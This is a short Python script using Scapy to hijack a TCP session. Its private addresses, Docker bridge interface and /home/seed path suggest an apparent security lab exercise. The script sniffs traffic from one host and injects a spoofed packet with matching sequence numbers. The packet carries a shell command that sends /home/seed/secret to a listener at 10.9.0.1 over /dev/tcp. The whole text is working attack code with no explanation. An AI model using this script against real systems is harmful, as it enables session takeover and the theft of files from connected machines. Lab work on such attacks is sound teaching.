#!/usr/bin/python3
from scapy.all import *
from time import *

print("TCP session hijacking ...")
print("sniff-and-spoof ...")

IP_src = "10.9.0.5"
IP_dst = "10.9.0.6"
my_iface = 'br-e69c731ae1e5'
my_filtering = 'tcp and src host {A}'.format(A=IP_src)

def spoof_tcp(pkt):
	IP_layer = IP( src=IP_src, dst=IP_dst )
	TCP_layer = TCP( flags="A", seq=pkt[TCP].seq, ack=pkt[TCP].ack, dport=pkt[TCP].dport, sport=pkt[TCP].sport )
	DATA = "\r cat /home/seed/secret > /dev/tcp/10.9.0.1/9090 \r"
	
	spoof_pkt = IP_layer/TCP_layer/DATA
	send( spoof_pkt, verbose=0 )

pkt = sniff(iface=my_iface, filter=my_filtering, prn=spoof_tcp)
